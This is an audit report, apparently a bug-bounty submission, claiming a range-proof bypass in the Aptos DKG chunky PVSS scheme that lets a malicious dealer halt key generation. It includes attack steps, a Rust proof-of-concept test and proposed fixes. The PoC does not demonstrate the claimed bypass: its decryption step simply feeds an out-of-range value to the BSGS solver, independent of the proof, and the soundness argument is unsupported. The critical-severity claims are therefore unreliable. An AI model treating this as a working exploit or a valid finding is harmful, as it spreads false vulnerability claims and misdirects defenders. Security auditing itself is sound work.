# Audit Report

## Title
Range Proof Bypass in Chunky PVSS Allows Malicious Chunks Outside Valid Range [0, 2^ell), Breaking DKG Protocol

## Summary
The DeKART v2 range proof implementation used in the chunky PVSS transcript only verifies that the first `ell` bits of committed values are binary, but does not enforce that the entire value is within the range [0, 2^ell). A malicious dealer can exploit this to craft chunks >= 2^ell that pass range proof verification but cause decryption failure, enabling a denial-of-service attack on the Distributed Key Generation (DKG) protocol.

## Finding Description

The chunky PVSS implementation uses a range proof to guarantee that encrypted share chunks are within the valid range [0, 2^ell). This invariant is critical because the Baby-Step Giant-Step (BSGS) discrete logarithm solver used during decryption has a search bound of 2^ell and will fail if chunks exceed this range. [1](#0-0) 

The vulnerability exists in the range proof proving algorithm. When constructing the proof, the prover extracts only the first `ell` bits from each value using `scalar_to_bits_le`: [2](#0-1) 

If a value `v >= 2^ell`, only the bits representing `v mod 2^ell` are extracted and proven to be binary. However, the commitment in `hatC` contains the full value `v`: [3](#0-2) 

The quotient polynomial `h` is then constructed to satisfy the verification equation even when the committed value differs from the bit reconstruction: [4](#0-3) 

The verification equation checks `LHS = RHS` where `LHS = a_h * V(gamma)` and `RHS = beta * (a - sum1) + sum2`. When `a` (evaluation of the polynomial through the full committed values) differs from `sum1` (reconstruction from the first `ell` bits), the malicious prover can construct `h` such that the equation still holds: [5](#0-4) 

When honest validators attempt to decrypt, the BSGS solver will fail because chunks exceed the search bound: [6](#0-5) 

The `dlog_vec` function returns `None` when any discrete log cannot be found within the range limit, causing decryption to panic: [7](#0-6) 

**Attack Path:**
1. Malicious dealer creates share chunks with values >= 2^ell (e.g., if ell=16, uses chunks >= 65536)
2. Calls `encrypt_chunked_shares` which invokes the range proof with these malicious chunks
3. Range proof only verifies the first `ell` bits are binary, accepting chunks outside [0, 2^ell)
4. Creates valid transcript that passes all verification checks
5. Honest validators accept the transcript and attempt decryption
6. BSGS discrete log solver fails because chunks exceed search range of 2^ell
7. Decryption panics, DKG protocol fails for the epoch

## Impact Explanation

**Critical Severity** - This vulnerability enables a denial-of-service attack on the DKG protocol, which is fundamental to Aptos validator operations:

1. **Total Loss of Liveness**: A malicious validator can submit a DKG transcript that passes verification but causes all honest validators to fail during decryption, preventing the generation of the distributed key for the next epoch.

2. **Consensus/Safety Violation**: The DKG is used to generate randomness and validator keys. Failure to complete DKG prevents epoch transitions and validator set updates, effectively halting the network.

3. **Breaks Cryptographic Invariant**: The discrete log security assumption requires chunks to be within the BSGS search range [0, 2^ell). This vulnerability breaks that invariant, undermining the security foundation of the chunky PVSS scheme.

4. **Network-Wide Impact**: Since DKG transcripts are aggregated and verified by all validators, a single malicious dealer can affect the entire validator set.

This meets the **Critical Severity** criteria per the Aptos bug bounty program: "Total loss of liveness/network availability" and "Consensus/Safety violations."

## Likelihood Explanation

**High Likelihood** - This vulnerability is highly likely to be exploited:

1. **Low Barrier to Entry**: Any validator participating in DKG can act as a dealer and submit malicious transcripts. No special privileges beyond being a validator are required.

2. **Easy to Exploit**: Creating chunks >= 2^ell is trivial - an attacker simply needs to modify chunk values before passing them to the range proof. The range proof will accept them due to the bit truncation bug.

3. **Guaranteed Impact**: The attack has deterministic success - malicious chunks will always pass verification and always cause decryption to fail, making this a reliable attack vector.

4. **No Detection**: The malicious transcript appears valid until decryption is attempted, making it difficult to detect and filter beforehand.

## Recommendation

Add an explicit range check in the range proof verification to ensure committed values are actually within [0, 2^ell):

**Fix in `dekart_univariate_v2.rs`:**

After extracting bits in the `prove` function, verify that the bit reconstruction equals the original value:

```rust
for &val in values.iter() {
    let bits = utils::scalar_to_bits_le::<E>(&val);
    
    // Verify value is within range [0, 2^ell)
    let reconstructed = bits.iter()
        .take(ell)
        .enumerate()
        .fold(E::ScalarField::ZERO, |acc, (j, &bit)| {
            acc + if bit { E::ScalarField::from(1u64 << j) } else { E::ScalarField::ZERO }
        });
    
    if reconstructed != val {
        return Err(anyhow::anyhow!(
            "Value {} exceeds range [0, 2^{})", val, ell
        ));
    }
    
    for j in 0..ell {
        f_js_evals[j].push(E::ScalarField::from(bits[j]));
    }
}
```

Alternatively, add validation in `encrypt_chunked_shares` before passing chunks to the range proof:

```rust
// Validate all chunks are in valid range
for chunk in &f_evals_chunked_flat {
    let max_chunk_value = E::ScalarField::from(1u128 << pp.ell);
    if *chunk >= max_chunk_value {
        panic!("Chunk value {} exceeds maximum {}", chunk, max_chunk_value);
    }
}
```

## Proof of Concept

```rust
#[cfg(test)]
mod range_proof_bypass_poc {
    use super::*;
    use ark_bls12_381::{Bls12_381, Fr};
    use ark_ff::UniformRand;
    use rand::thread_rng;

    #[test]
    #[should_panic(expected = "dlog_vec failed")]
    fn test_range_proof_bypass_attack() {
        let mut rng = thread_rng();
        let ell = 16u8; // Valid range should be [0, 2^16) = [0, 65536)
        
        // Setup range proof keys
        let (pk, vk) = dekart_univariate_v2::Proof::<Bls12_381>::setup(
            100,
            ell as usize,
            GroupGenerators::default(),
            &mut rng,
        );
        
        // Malicious dealer creates chunks OUTSIDE valid range
        let malicious_chunk = Fr::from(65536u64); // Exactly 2^16, outside [0, 2^16)
        let malicious_chunks = vec![malicious_chunk; 10];
        
        // Commit to malicious chunks
        let rho = univariate_hiding_kzg::CommitmentRandomness::rand(&mut rng);
        let comm = dekart_univariate_v2::Proof::<Bls12_381>::commit_with_randomness(
            &pk.ck_S,
            &malicious_chunks,
            &rho,
        );
        
        // Generate range proof - THIS SHOULD FAIL BUT DOESN'T!
        let proof = dekart_univariate_v2::Proof::<Bls12_381>::prove(
            &pk,
            &malicious_chunks,
            ell as usize,
            &comm,
            &rho,
            &mut rng,
        );
        
        // Verification PASSES (vulnerability!)
        proof.verify(&vk, malicious_chunks.len(), ell as usize, &comm)
            .expect("Range proof verification should fail but passes!");
        
        // Now attempt decryption - this will PANIC
        let pp = chunked_elgamal::PublicParameters::<ark_bls12_381::G1Projective>::default();
        let table = dlog::table::build(pp.G.into_group(), 1 << ell);
        let dk = Fr::rand(&mut rng);
        
        // Create ciphertexts with malicious chunks
        let R = pp.H.into_group() * Fr::rand(&mut rng);
        let C = pp.G.into_group() * malicious_chunk + R * dk;
        
        // BSGS will fail because chunk 65536 is outside search range [0, 65536)
        bsgs::dlog_vec(
            pp.G.into_group(),
            &[C - R * dk],
            &table,
            1 << ell, // Search bound is 2^16 = 65536
        )
        .expect("dlog_vec failed"); // PANICS HERE - DKG broken!
    }
}
```

**Notes:**
- The vulnerability stems from a semantic mismatch: the range proof uses bit decomposition which implicitly performs modular reduction, while the commitment contains unreduced values
- The honest implementation using `scalar_to_le_chunks` produces valid chunks, but the verification doesn't enforce this constraint, allowing malicious dealers to bypass it
- This affects the DKG protocol during validator epoch transitions, potentially halting network consensus

### Citations

**File:** crates/aptos-dkg/src/pvss/chunky/weighted_transcript.rs (L648-748)
```rust
    pub fn encrypt_chunked_shares<
        'a,
        A: Serialize + Clone,
        R: rand_core::RngCore + rand_core::CryptoRng,
    >(
        f_evals: &[E::ScalarField],
        eks: &[keys::EncryptPubKey<E>],
        pp: &PublicParameters<E>,
        sc: &<Self as traits::Transcript>::SecretSharingConfig, // only for debugging purposes?
        sok_cntxt: SokContext<'a, A>,
        rng: &mut R,
    ) -> (Vec<Vec<Vec<E::G1>>>, Vec<Vec<E::G1>>, SharingProof<E>) {
        // Generate the required randomness
        let hkzg_randomness = univariate_hiding_kzg::CommitmentRandomness::rand(rng);
        let elgamal_randomness = Scalar::vecvec_from_inner(
            (0..sc.get_max_weight())
                .map(|_| {
                    chunked_elgamal::correlated_randomness(
                        rng,
                        1 << pp.ell as u64,
                        num_chunks_per_scalar::<E::ScalarField>(pp.ell),
                        &E::ScalarField::ZERO,
                    )
                })
                .collect(),
        );

        // Chunk and flatten the shares
        let f_evals_chunked: Vec<Vec<E::ScalarField>> = f_evals
            .iter()
            .map(|f_eval| chunks::scalar_to_le_chunks(pp.ell, f_eval))
            .collect();
        // Flatten it now (for use in the range proof) before `f_evals_chunked` is consumed in the next step
        let f_evals_chunked_flat: Vec<E::ScalarField> =
            f_evals_chunked.iter().flatten().copied().collect();
        // Separately, gather the chunks by weight
        let f_evals_weighted = sc.group_by_player(&f_evals_chunked);

        // Now generate the encrypted shares and range proof commitment, together with its SoK, so:
        // (1) Set up the witness
        let witness = HkzgWeightedElgamalWitness {
            hkzg_randomness,
            chunked_plaintexts: Scalar::vecvecvec_from_inner(f_evals_weighted),
            elgamal_randomness,
        };
        // (2) Compute its image under the corresponding homomorphism, and produce an SoK
        //   (2a) Set up the tuple homomorphism
        let eks_inner: Vec<_> = eks.iter().map(|ek| ek.ek).collect(); // TODO: this is a bit ugly
        let lagr_g1: &[E::G1Affine] = match &pp.pk_range_proof.ck_S.msm_basis {
            SrsBasis::Lagrange { lagr: lagr_g1 } => lagr_g1,
            SrsBasis::PowersOfTau { .. } => {
                panic!("Expected a Lagrange basis, received powers of tau basis instead")
            },
        };
        let hom = hkzg_chunked_elgamal::WeightedHomomorphism::<E>::new(
            lagr_g1,
            pp.pk_range_proof.ck_S.xi_1,
            &pp.pp_elgamal,
            &eks_inner,
        );
        //   (2b) Compute its image (the public statement), so the range proof commitment and chunked_elgamal encryptions
        let statement = hom.apply(&witness);
        //   (2c) Produce the SoK
        let SoK = hom
            .prove(&witness, &statement, &sok_cntxt, rng)
            .change_lifetime(); // Make sure the lifetime of the proof is not coupled to `hom` which has references

        // Destructure the "public statement" of the above sigma protocol
        let TupleCodomainShape(
            range_proof_commitment,
            chunked_elgamal::WeightedCodomainShape {
                chunks: Cs,
                randomness: Rs,
            },
        ) = statement;

        // debug_assert_eq!(
        //     Cs.len(),
        //     sc.get_total_weight(),
        //     "Number of encrypted chunks must equal number of players"
        // );

        // Generate the batch range proof, given the `range_proof_commitment` produced in the PoK
        let range_proof = dekart_univariate_v2::Proof::prove(
            &pp.pk_range_proof,
            &f_evals_chunked_flat,
            pp.ell as usize,
            &range_proof_commitment,
            &hkzg_randomness,
            rng,
        );

        // Assemble the sharing proof
        let sharing_proof = SharingProof {
            SoK,
            range_proof,
            range_proof_commitment,
        };

        (Cs, Rs, sharing_proof)
    }
```

**File:** crates/aptos-dkg/src/range_proofs/dekart_univariate_v2.rs (L419-438)
```rust
        let f_js_evals: Vec<Vec<E::ScalarField>> = {
            let mut f_js_evals = vec![Vec::with_capacity(num_omegas); ell];

            for j in 0..ell {
                f_js_evals[j].push(rs[j]);
            }

            for &val in values.iter() {
                let bits = utils::scalar_to_bits_le::<E>(&val);
                for j in 0..ell {
                    f_js_evals[j].push(E::ScalarField::from(bits[j]));
                }
            }

            for f_j in &mut f_js_evals {
                f_j.resize(num_omegas, E::ScalarField::ZERO);
            }

            f_js_evals
        };
```

**File:** crates/aptos-dkg/src/range_proofs/dekart_univariate_v2.rs (L466-475)
```rust
        let hat_f_evals: Vec<E::ScalarField> = {
            let mut v = Vec::with_capacity(num_omegas);
            v.push(r);
            v.extend_from_slice(values);
            v.resize(num_omegas, E::ScalarField::ZERO);
            v
        };

        let hat_f_coeffs = eval_dom.ifft(&hat_f_evals);
        debug_assert_eq!(hat_f_coeffs.len(), pk.max_n + 1);
```

**File:** crates/aptos-dkg/src/range_proofs/dekart_univariate_v2.rs (L503-557)
```rust
        let h_evals: Vec<E::ScalarField> = {
            let mut result = Vec::with_capacity(num_omegas);

            let first_h_eval = {
                let mut pow2 = E::ScalarField::ONE;
                let mut sum_pow2_rs = E::ScalarField::ZERO;
                for r_j in &rs {
                    sum_pow2_rs += pow2 * r_j;
                    pow2 = pow2.double();
                }

                let sum_betas_term: E::ScalarField = betas
                    .iter()
                    .zip(&rs)
                    .map(|(&beta_j, r_j)| beta_j * r_j * (*r_j - E::ScalarField::ONE))
                    .sum();

                let numerator = beta * (r - sum_pow2_rs) + sum_betas_term;
                numerator * num_omegas_inv
            };
            result.push(first_h_eval);

            for i in 1..num_omegas {
                // First term: beta * diff_hat_f_evals[i]
                let mut val = diff_hat_f_evals[i];

                // Second term: -beta * sum_j 2^j * f_j_evals[j][i]
                let sum1: E::ScalarField = diff_f_js_evals
                    .iter()
                    .enumerate()
                    .map(|(j, diff_f_j)| E::ScalarField::from(1u64 << j) * diff_f_j[i])
                    .sum();
                val = (val - sum1) * beta;

                // Third term: sum_j betas[j] * diff_f_j * (2*f_j - 1)
                let sum2: E::ScalarField = diff_f_js_evals
                    .iter()
                    .zip(f_js_evals.iter())
                    .enumerate()
                    .map(|(j, (diff_f_j, f_j))| {
                        betas[j]
                            * diff_f_j[i]
                            * (E::ScalarField::from(2u64) * f_j[i] - E::ScalarField::ONE)
                    })
                    .sum();
                val += sum2;

                // Divide by precomputed denominator
                val *= prover_precomputed.h_denom_eval[i];

                result.push(val);
            }

            result
        };
```

**File:** crates/aptos-dkg/src/range_proofs/dekart_univariate_v2.rs (L765-794)
```rust
        let LHS = {
            // First compute V_SS^*(gamma), where V_SS^*(X) is the polynomial (X^{max_n + 1} - 1) / (X - 1)
            let V_eval_gamma = {
                let gamma_pow = gamma.pow([num_omegas as u64]);
                (gamma_pow - E::ScalarField::ONE) * (gamma - E::ScalarField::ONE).inverse().unwrap()
            };

            *a_h * V_eval_gamma
        };

        let RHS = {
            // Compute sum_j 2^j a_j
            let sum1: E::ScalarField = verifier_precomputed
                .powers_of_two
                .iter()
                .zip(a_js.iter())
                .map(|(&power_of_two, aj)| power_of_two * aj)
                .sum();

            // Compute sum_j beta_j a_j (a_j - 1)
            let sum2: E::ScalarField = beta_js
                .iter()
                .zip(a_js.iter())
                .map(|(beta, &a)| a * (a - E::ScalarField::ONE) * beta) // TODO: submit PR to change arkworks so beta can be on the left...
                .sum();

            beta * (*a - sum1) + sum2
        };

        anyhow::ensure!(LHS == RHS);
```

**File:** crates/aptos-dkg/src/pvss/chunky/chunked_elgamal.rs (L317-350)
```rust
pub fn decrypt_chunked_scalars<C: CurveGroup>(
    Cs_rows: &[Vec<C>],
    Rs_rows: &[Vec<C>],
    dk: &C::ScalarField,
    pp: &PublicParameters<C>,
    table: &HashMap<Vec<u8>, u32>,
    radix_exponent: u8,
) -> Vec<C::ScalarField> {
    let mut decrypted_scalars = Vec::with_capacity(Cs_rows.len());

    for (row, Rs_row) in Cs_rows.iter().zip(Rs_rows.iter()) {
        // Compute C - d_k * R for each chunk
        let exp_chunks: Vec<C> = row
            .iter()
            .zip(Rs_row.iter())
            .map(|(C_ij, &R_j)| C_ij.sub(R_j * *dk))
            .collect();

        // Recover plaintext chunks
        let chunk_values: Vec<_> =
            bsgs::dlog_vec(pp.G.into_group(), &exp_chunks, &table, 1 << radix_exponent)
                .expect("dlog_vec failed")
                .into_iter()
                .map(|x| C::ScalarField::from(x))
                .collect();

        // Convert chunks back to scalar
        let recovered = chunks::le_chunks_to_scalar(radix_exponent, &chunk_values);

        decrypted_scalars.push(recovered);
    }

    decrypted_scalars
}
```

**File:** crates/aptos-dkg/src/dlog/bsgs.rs (L50-67)
```rust
pub fn dlog_vec<C: CurveGroup>(
    G: C,
    H_vec: &[C],
    baby_table: &HashMap<Vec<u8>, u32>,
    range_limit: u32,
) -> Option<Vec<u32>> {
    let mut result = Vec::with_capacity(H_vec.len());

    for H in H_vec {
        if let Some(x) = dlog(G, *H, baby_table, range_limit) {
            result.push(x);
        } else {
            return None; // fail early if any element cannot be solved
        }
    }

    Some(result)
}
```
